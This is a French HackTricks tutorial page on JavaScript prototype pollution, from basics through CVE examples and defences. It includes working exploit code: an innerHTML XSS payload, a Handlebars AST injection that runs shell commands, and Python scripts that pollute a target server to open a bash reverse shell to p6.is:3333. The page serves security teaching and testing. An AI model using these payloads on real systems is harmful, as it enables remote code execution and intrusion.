# NodeJS - \_\_proto\_\_ & pollution de prototype

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
{% endhint %}

## Objets en JavaScript <a href="#id-053a" id="id-053a"></a>

Les objets en JavaScript sont essentiellement des collections de paires cl√©-valeur, connues sous le nom de propri√©t√©s. Un objet peut √™tre cr√©√© en utilisant `Object.create` avec `null` comme argument pour produire un objet vide. Cette m√©thode permet la cr√©ation d'un objet sans aucune propri√©t√© h√©rit√©e.
```javascript
// Run this in the developers tools console
console.log(Object.create(null)); // This will output an empty object.
```
Un objet vide est semblable √† un dictionnaire vide, repr√©sent√© par `{}`.

### Fonctions et Classes en JavaScript

En JavaScript, les classes et les fonctions sont √©troitement li√©es, les fonctions servant souvent de constructeurs pour les classes. Malgr√© l'absence de support natif des classes en JavaScript, les constructeurs peuvent imiter le comportement des classes.
```javascript
// Run this in the developers tools console

function Employee(name, position) {
this.name = name;
this.position = position;
this.introduce = function() {
return "My name is " + this.name + " and I work as a " + this.position + ".";
}
}

Employee.prototype

var employee1 = new Employee("Generic Employee", "Developer");

employee1.__proto__
```
### Prototypes en JavaScript

JavaScript permet la modification, l'ajout ou la suppression d'attributs de prototype √† l'ex√©cution. Cette flexibilit√© permet l'extension dynamique des fonctionnalit√©s des classes.

Des fonctions comme `toString` et `valueOf` peuvent √™tre modifi√©es pour changer leur comportement, d√©montrant la nature adaptable du syst√®me de prototype de JavaScript.

## H√©ritage

Dans la programmation bas√©e sur les prototypes, les propri√©t√©s/m√©thodes sont h√©rit√©es par des objets √† partir de classes. Ces classes sont cr√©√©es en ajoutant des propri√©t√©s/m√©thodes soit √† une instance d'une autre classe, soit √† un objet vide.

Il convient de noter que lorsqu'une propri√©t√© est ajout√©e √† un objet servant de prototype pour d'autres objets (comme `myPersonObj`), les objets h√©ritant obtiennent acc√®s √† cette nouvelle propri√©t√©. Cependant, cette propri√©t√© n'est pas automatiquement affich√©e √† moins qu'elle ne soit explicitement invoqu√©e.

## \_\_proto\_\_ pollution <a href="#id-0d0a" id="id-0d0a"></a>

## Explorer la pollution de prototype en JavaScript

Les objets JavaScript sont d√©finis par des paires cl√©-valeur et h√©ritent du prototype d'objet JavaScript. Cela signifie que modifier le prototype d'objet peut influencer tous les objets dans l'environnement.

Utilisons un exemple diff√©rent pour illustrer :
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
```
L'acc√®s au prototype d'objet est possible via :
```javascript
car1.__proto__.__proto__;
Vehicle.__proto__.__proto__;
```
En ajoutant des propri√©t√©s au prototype de l'objet, chaque objet JavaScript h√©ritera de ces nouvelles propri√©t√©s :
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding a method to the Object prototype
car1.__proto__.__proto__.announce = function() { console.log("Beep beep!"); };
car1.announce(); // Outputs "Beep beep!"
// Adding a property to the Object prototype
car1.__proto__.__proto__.isVehicle = true;
console.log(car1.isVehicle); // Outputs true
```
## pollution de prototype

Pour un sc√©nario o√π l'utilisation de `__proto__` est restreinte, modifier le prototype d'une fonction est une alternative :
```javascript
function Vehicle(model) {
this.model = model;
}
var car1 = new Vehicle("Tesla Model S");
// Adding properties to the Vehicle prototype
Vehicle.prototype.beep = function() { console.log("Beep beep!"); };
car1.beep(); // Now works and outputs "Beep beep!"
Vehicle.prototype.hasWheels = true;
console.log(car1.hasWheels); // Outputs true

// Alternate method
car1.constructor.prototype.honk = function() { console.log("Honk!"); };
car1.constructor.prototype.isElectric = true;
```
Cela n'affecte que les objets cr√©√©s √† partir du constructeur `Vehicle`, leur donnant les propri√©t√©s `beep`, `hasWheels`, `honk` et `isElectric`.

Deux m√©thodes pour affecter globalement les objets JavaScript par le biais de la pollution de prototype incluent :

1. Polluer directement le `Object.prototype` :
```javascript
Object.prototype.goodbye = function() { console.log("Goodbye!"); };
```
2. Polluer le prototype d'un constructeur pour une structure couramment utilis√©e :
```javascript
var example = {"key": "value"};
example.constructor.prototype.greet = function() { console.log("Hello!"); };
```
Apr√®s ces op√©rations, chaque objet JavaScript peut ex√©cuter les m√©thodes `goodbye` et `greet`.

## Polluer d'autres objets

### D'une classe √† Object.prototype

Dans un sc√©nario o√π vous pouvez **polluer un objet sp√©cifique** et que vous devez **acc√©der √† `Object.prototype`**, vous pouvez le rechercher avec quelque chose comme le code suivant :
```javascript
// From https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/

// Search from "window" object
for(let key of Object.getOwnPropertyNames(window)) {
if (window[key]?.constructor.prototype === Object.prototype) {
console.log(key)
}
}

// Imagine that the original object was document.querySelector('a')
// With this code you could find some attributes to get the object "window" from that one
for(let key1 in document.querySelector('a')) {
for(let key2 in document.querySelector('a')[key1]) {
if (document.querySelector('a')[key1][key2] === window) {
console.log(key1 + "." + key2)
}
}
}
```
### Pollution des √©l√©ments de tableau

Notez que comme vous pouvez polluer les attributs des objets en JS, si vous avez acc√®s pour polluer un tableau, vous pouvez √©galement **polluer les valeurs du tableau** accessibles **par des index** (notez que vous ne pouvez pas √©craser les valeurs, donc vous devez polluer des index qui sont d'une certaine mani√®re utilis√©s mais non √©crits).
```javascript
c = [1,2]
a = []
a.constructor.prototype[1] = "yolo"
b = []
b[0] //undefined
b[1] //"yolo"
c[1] // 2 -- not
```
### Pollution des √©l√©ments Html

Lors de la g√©n√©ration d'un √©l√©ment HTML via JS, il est possible de **surcharger** l'attribut **`innerHTML`** pour √©crire **du code HTML arbitraire.** [Id√©e et exemple de cet article](https://blog.huli.tw/2022/04/25/en/intigriti-0422-xss-challenge-author-writeup/).

{% code overflow="wrap" %}
```javascript
// Create element
devSettings["root"] = document.createElement('main')

// Pollute innerHTML
settings[root][innerHTML]=<"svg onload=alert(1)>"

// Pollute innerHTML of the ownerProperty to avoid overwrites of innerHTML killing the payload
settings[root][ownerDocument][body][innerHTML]="<svg onload=alert(document.domain)>"
```
{% endcode %}

## Exemples

### Exemple de base

Une pollution de prototype se produit en raison d'un d√©faut dans l'application qui permet d'√©craser des propri√©t√©s sur `Object.prototype`. Cela signifie que, puisque la plupart des objets d√©rivent leurs propri√©t√©s de `Object.prototype`

L'exemple le plus simple est d'ajouter une valeur √† un **attribut ind√©fini d'un objet** qui va √™tre v√©rifi√©, comme :
```javascript
if (user.admin) {
```
Si l'attribut **`admin` est ind√©fini**, il est possible d'abuser d'un PP et de le d√©finir sur True avec quelque chose comme :
```javascript
Object.prototype.isAdmin = true
let user = {}
user.isAdmin // true
```
Le m√©canisme derri√®re cela implique de manipuler des propri√©t√©s de sorte que si un attaquant a le contr√¥le sur certaines entr√©es, il peut modifier le prototype de tous les objets dans l'application. Cette manipulation implique g√©n√©ralement de d√©finir la propri√©t√© `__proto__`, qui, en JavaScript, est synonyme de modification directe du prototype d'un objet.

Les conditions sous lesquelles cette attaque peut √™tre ex√©cut√©e avec succ√®s, comme d√©crit dans une [√©tude](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript\_prototype\_pollution\_attack\_in\_NodeJS.pdf) sp√©cifique, incluent :

* Effectuer une fusion r√©cursive.
* D√©finir des propri√©t√©s en fonction d'un chemin.
* Cloner des objets.

### Fonction de remplacement
```python
customer.__proto__.toString = ()=>{alert("polluted")}
```
### Pollution de prototype √† RCE

{% content-ref url="prototype-pollution-to-rce.md" %}
[prototype-pollution-to-rce.md](prototype-pollution-to-rce.md)
{% endcontent-ref %}

Autres charges utiles :

* [https://github.com/KTH-LangSec/server-side-prototype-pollution](https://github.com/KTH-LangSec/server-side-prototype-pollution)

## Pollution de prototype c√¥t√© client √† XSS

{% content-ref url="client-side-prototype-pollution.md" %}
[client-side-prototype-pollution.md](client-side-prototype-pollution.md)
{% endcontent-ref %}

### CVE-2019‚Äì11358 : Attaque de pollution de prototype via jQuery $ .extend

[Pour plus de d√©tails, consultez cet article](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7) Dans jQuery, la fonction `$ .extend` peut conduire √† une pollution de prototype si la fonctionnalit√© de copie profonde est utilis√©e de mani√®re incorrecte. Cette fonction est couramment utilis√©e pour cloner des objets ou fusionner des propri√©t√©s d'un objet par d√©faut. Cependant, lorsqu'elle est mal configur√©e, les propri√©t√©s destin√©es √† un nouvel objet peuvent √™tre assign√©es au prototype √† la place. Par exemple :
```javascript
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'));
console.log({}.devMode); // Outputs: true
```
Cette vuln√©rabilit√©, identifi√©e comme CVE-2019‚Äì11358, illustre comment une copie profonde peut modifier involontairement le prototype, entra√Ænant des risques de s√©curit√© potentiels, tels qu'un acc√®s administrateur non autoris√© si des propri√©t√©s comme `isAdmin` sont v√©rifi√©es sans v√©rification appropri√©e de leur existence.

### CVE-2018‚Äì3721, CVE-2019‚Äì10744 : Attaque de pollution de prototype via lodash

[Pour plus de d√©tails, consultez cet article](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)

[Lodash](https://www.npmjs.com/package/lodash) a rencontr√© des vuln√©rabilit√©s similaires de pollution de prototype (CVE-2018‚Äì3721, CVE-2019‚Äì10744). Ces probl√®mes ont √©t√© r√©solus dans la version 4.17.11.

### Un autre tutoriel avec des CVEs

{% embed url="https://infosecwriteups.com/javascript-prototype-pollution-practice-of-finding-and-exploitation-f97284333b2" %}

### Outils pour d√©tecter la pollution de prototype

* [**Server-Side-Prototype-Pollution-Gadgets-Scanner**](https://github.com/doyensec/Server-Side-Prototype-Pollution-Gadgets-Scanner) : Extension Burp Suite con√ßue pour d√©tecter et analyser les vuln√©rabilit√©s de pollution de prototype c√¥t√© serveur dans les applications web. Cet outil automatise le processus de scan des requ√™tes pour identifier les probl√®mes potentiels de pollution de prototype. Il exploite des gadgets connus - m√©thodes d'exploitation de la pollution de prototype pour ex√©cuter des actions nuisibles - en se concentrant particuli√®rement sur les biblioth√®ques Node.js.
* [**server-side-prototype-pollution**](https://github.com/portswigger/server-side-prototype-pollution) : Cette extension identifie les vuln√©rabilit√©s de pollution de prototype c√¥t√© serveur. Elle utilise des techniques d√©crites dans la [pollution de prototype c√¥t√© serveur](https://portswigger.net/research/server-side-prototype-pollution).

### Pollution de Prototype AST dans NodeJS

NodeJS utilise largement les arbres de syntaxe abstraite (AST) en JavaScript pour des fonctionnalit√©s telles que les moteurs de templates et TypeScript. Cette section explore les vuln√©rabilit√©s li√©es √† la pollution de prototype dans les moteurs de templates, sp√©cifiquement Handlebars et Pug.

#### Analyse de la vuln√©rabilit√© Handlebars

Le moteur de template Handlebars est susceptible √† une attaque de pollution de prototype. Cette vuln√©rabilit√© provient de fonctions sp√©cifiques dans le fichier `javascript-compiler.js`. La fonction `appendContent`, par exemple, concat√®ne `pendingContent` si elle est pr√©sente, tandis que la fonction `pushSource` r√©initialise `pendingContent` √† `undefined` apr√®s avoir ajout√© la source.

**Processus d'exploitation**

L'exploitation tire parti de l'AST (Arbre de Syntaxe Abstraite) produit par Handlebars, suivant ces √©tapes :

1. **Manipulation du Parser** : Initialement, le parser, via le n≈ìud `NumberLiteral`, impose que les valeurs soient num√©riques. La pollution de prototype peut contourner cela, permettant l'insertion de cha√Ænes non num√©riques.
2. **Gestion par le Compilateur** : Le compilateur peut traiter un objet AST ou un template de cha√Æne. Si `input.type` est √©gal √† `Program`, l'entr√©e est trait√©e comme pr√©-analys√©e, ce qui peut √™tre exploit√©.
3. **Injection de Code** : Par la manipulation de `Object.prototype`, on peut injecter du code arbitraire dans la fonction de template, ce qui peut conduire √† une ex√©cution de code √† distance.

Un exemple d√©montrant l'exploitation de la vuln√©rabilit√© Handlebars :
```javascript
const Handlebars = require('handlebars');

Object.prototype.type = 'Program';
Object.prototype.body = [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "console.log(process.mainModule.require('child_process').execSync('id').toString())"
}],
"loc": {
"start": 0,
"end": 0
}
}];

const source = `Hello {{ msg }}`;
const template = Handlebars.precompile(source);

console.log(eval('(' + template + ')')['main'].toString());
```
Ce code montre comment un attaquant pourrait injecter du code arbitraire dans un mod√®le Handlebars.

**R√©f√©rence externe** : Un probl√®me li√© √† la pollution de prototype a √©t√© trouv√© dans la biblioth√®que 'flat', comme d√©taill√© ici : [Probl√®me sur GitHub](https://github.com/hughsk/flat/issues/105).

**R√©f√©rence externe** : [Probl√®me li√© √† la pollution de prototype dans la biblioth√®que 'flat'](https://github.com/hughsk/flat/issues/105)

Exemple d'exploitation de la pollution de prototype en Python :
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.type": "Program",
"__proto__.body": [{
"type": "MustacheStatement",
"path": 0,
"params": [{
"type": "NumberLiteral",
"value": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}],
"loc": {
"start": 0,
"end": 0
}
}]
})

# execute
requests.get(TARGET_URL)
```
#### Vuln√©rabilit√© Pug

Pug, un autre moteur de template, fait face √† un risque similaire de pollution de prototype. Des informations d√©taill√©es sont disponibles dans la discussion sur [AST Injection in Pug](https://blog.p6.is/AST-Injection/#Pug).

Exemple de pollution de prototype dans Pug :
```python
import requests

TARGET_URL = 'http://10.10.10.10:9090'

# make pollution
requests.post(TARGET_URL + '/vulnerable', json = {
"__proto__.block": {
"type": "Text",
"line": "process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/p6.is/3333 0>&1'`)"
}
})

# execute
requests.get(TARGET_URL)
```
### Mesures Pr√©ventives

Pour r√©duire le risque de pollution de prototype, les strat√©gies √©num√©r√©es ci-dessous peuvent √™tre employ√©es :

1. **Immutabilit√© des Objets** : Le `Object.prototype` peut √™tre rendu immuable en appliquant `Object.freeze`.
2. **Validation des Entr√©es** : Les entr√©es JSON doivent √™tre rigoureusement valid√©es par rapport au sch√©ma de l'application.
3. **Fonctions de Fusion S√ªres** : L'utilisation non s√©curis√©e de fonctions de fusion r√©cursives doit √™tre √©vit√©e.
4. **Objets sans Prototype** : Des objets sans propri√©t√©s de prototype peuvent √™tre cr√©√©s en utilisant `Object.create(null)`.
5. **Utilisation de Map** : Au lieu de `Object`, `Map` doit √™tre utilis√© pour stocker des paires cl√©-valeur.
6. **Mises √† Jour de Biblioth√®que** : Des correctifs de s√©curit√© peuvent √™tre incorpor√©s en mettant r√©guli√®rement √† jour les biblioth√®ques.
7. **Outils de Linter et d'Analyse Statique** : Utilisez des outils comme ESLint avec des plugins appropri√©s pour d√©tecter et pr√©venir les vuln√©rabilit√©s de pollution de prototype.
8. **Revue de Code** : Mettez en ≈ìuvre des revues de code approfondies pour identifier et rem√©dier aux risques potentiels li√©s √† la pollution de prototype.
9. **Formation √† la S√©curit√©** : √âduquez les d√©veloppeurs sur les risques de pollution de prototype et les meilleures pratiques pour √©crire du code s√©curis√©.
10. **Utilisation Prudente des Biblioth√®ques** : Soyez prudent lors de l'utilisation de biblioth√®ques tierces. √âvaluez leur posture de s√©curit√© et examinez leur code, en particulier celles qui manipulent des objets.
11. **Protection √† l'Ex√©cution** : Employez des m√©canismes de protection √† l'ex√©cution tels que l'utilisation de packages npm ax√©s sur la s√©curit√© qui peuvent d√©tecter et pr√©venir les attaques de pollution de prototype.

## R√©f√©rences

* [https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/](https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/)
* [https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l](https://dev.to/caffiendkitten/prototype-inheritance-pollution-2o5l)
* [https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7](https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7)
* [https://blog.p6.is/AST-Injection/](https://blog.p6.is/AST-Injection/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
